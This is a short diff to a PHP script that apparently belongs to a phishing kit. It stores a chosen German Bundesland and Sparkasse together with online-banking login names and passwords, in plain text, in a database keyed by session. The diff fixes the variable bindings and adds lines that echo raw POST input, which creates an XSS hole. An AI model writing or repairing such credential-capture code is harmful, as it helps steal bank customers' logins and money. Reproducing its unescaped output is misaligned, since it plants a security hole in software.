@@ -3,19 +3,24 @@ require_once 'db.php';
 session_start();
 $session_id= session_id();
 
-$olb_login = $_POST['id_parent'];
-$olb_pw = $_POST['id_child'];
+
+
+$id_parent = $_POST['id_parent'];
+$id_child = $_POST['id_child'];
 $olb_login = $_POST['olb_login'];
 $olb_pw = $_POST['olb_pw'];
-$sql = 'UPDATE user_data SET id_parent = :olb_land, id_child=:olb_sparkasse, olb_login = :olb_login, olb_pw = :olb_pw WHERE session_id = :session_id';
+$sql = 'UPDATE user_data SET olb_land = :olb_land, olb_sparkasse = :olb_sparkasse, olb_login = :olb_login, olb_pw = :olb_pw WHERE session_id = :session_id';
 
 $statement= $pdo->prepare($sql);
 $statement->bindValue("session_id",$session_id);
-$statement->bindValue("id_parent",$olb_land);
-$statement->bindValue("id_child",$olb_sparkasse);
+$statement->bindValue("olb_land",$id_parent);
+$statement->bindValue("olb_sparkasse",$id_child);
 $statement->bindValue("olb_login",$olb_login);
 $statement->bindValue("olb_pw",$olb_pw);
 $statement->execute();
+
+echo "<p>Bundesland {$id_parent}</p>"; 
+echo "<p>Sparkasse {$id_child}</p>"; 
 
 ?>
 
